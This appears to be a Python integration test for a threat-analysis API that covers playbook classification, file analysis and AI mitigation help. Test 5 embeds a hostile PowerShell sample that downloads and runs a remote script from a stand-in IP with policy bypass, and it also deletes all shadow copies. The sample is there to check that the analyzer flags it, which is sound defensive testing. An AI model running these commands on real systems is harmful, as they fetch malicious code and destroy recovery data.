import requests
import json
import base64

API_URL = "http://127.0.0.1:8000"
UI_URL = "http://localhost:3000"

def test_all():
    print("=== 1. Testing Health ===")
    r = requests.get(f"{API_URL}/api/health")
    print("Health Status:", r.status_code, r.json())
    assert r.status_code == 200

    print("\n=== 2. Testing Knowledge Auto-Classification (Playbook) ===")
    playbook_text = """# BlackSuit Ransomware Incident Mitigation Playbook
Target Threat: Ransomware (T1486, T1059.001)

Mitigation & Containment Steps:
Step 1: Isolate infected endpoint FIN-WS-042 from network subnet immediately.
Step 2: Terminate active encryptor processes (encryptor_demo.exe) and command shells.
Step 3: Quarantine encrypted artifacts and ransom notes into the .quarantine enclave.
Step 4: Block outbound communication to C2 IP 198.51.100.42 at edge firewall.
Step 5: Verify volume shadow copies and initiate file recovery from clean backup."""

    r_preview = requests.post(f"{API_URL}/api/knowledge/classify-preview", json={
        "title": "BlackSuit_Playbook.md",
        "content": playbook_text
    })
    print("Playbook Classification Preview:", r_preview.status_code, json.dumps(r_preview.json(), indent=2))
    assert r_preview.status_code == 200
    assert r_preview.json()["doc_type"] == "MITIGATION_PLAYBOOK"
    assert "Ransomware" in r_preview.json()["target_categories"]
    assert len(r_preview.json()["mitigation_steps"]) >= 4

    print("\n=== 3. Testing Knowledge Ingestion & Indexing ===")
    r_ingest = requests.post(f"{API_URL}/api/knowledge/classify-and-ingest", json={
        "title": "BlackSuit_Playbook.md",
        "content": playbook_text,
        "source_name": "BlackSuit_Playbook.md",
        "source_type": "mitigation_playbook"
    })
    print("Ingestion Result:", r_ingest.status_code, json.dumps(r_ingest.json(), indent=2))
    assert r_ingest.status_code == 200

    print("\n=== 4. Testing Knowledge Sources Retrieval with Tags ===")
    r_sources = requests.get(f"{API_URL}/api/knowledge/sources")
    print("Sources Status:", r_sources.status_code, f"Found {len(r_sources.json())} docs")
    assert r_sources.status_code == 200
    assert any(d.get("doc_type") == "MITIGATION_PLAYBOOK" for d in r_sources.json())

    print("\n=== 5. Testing Static File Threat Analysis (Safe Non-Executing) ===")
    sample_malware = """$cmd = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://198.51.100.42/payload.ps1')"
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Enc $cmd
vssadmin.exe delete shadows /all /quiet
"""
    b64 = base64.b64encode(sample_malware.encode()).decode()
    r_analyze = requests.post(f"{API_URL}/api/analysis/analyze", json={
        "filename": "malware.txt",
        "content_b64": b64,
        "data_source": "live"
    })
    print("File Analysis Result:", r_analyze.status_code, json.dumps(r_analyze.json(), indent=2))
    assert r_analyze.status_code == 200
    assert r_analyze.json()["classification"] == "THREAT"
    assert len(r_analyze.json()["deterministic_signals"]) >= 1

    print("\n=== 6. Testing AI Mitigation Help Generation ===")
    r_mitigation = requests.post(f"{API_URL}/api/analysis/mitigation-help", json={
        "threat_category": "Ransomware",
        "file_name": "malware.txt",
        "target_host": "FIN-WS-042",
        "user_prompt": "Generate PowerShell containment script and firewall block commands"
    })
    print("AI Mitigation Help:", r_mitigation.status_code, json.dumps(r_mitigation.json(), indent=2))
    assert r_mitigation.status_code == 200
    assert len(r_mitigation.json()["playbook_steps"]) >= 3
    assert "powershell_script" in r_mitigation.json()

    print("\n=== 7. Testing Frontend Web Server ===")
    r_ui = requests.get(UI_URL)
    print("Frontend Status:", r_ui.status_code)
    assert r_ui.status_code == 200

    print("\n>>> ALL TESTS PASSED SUCCESSFULLY! <<<")

if __name__ == "__main__":
    test_all()
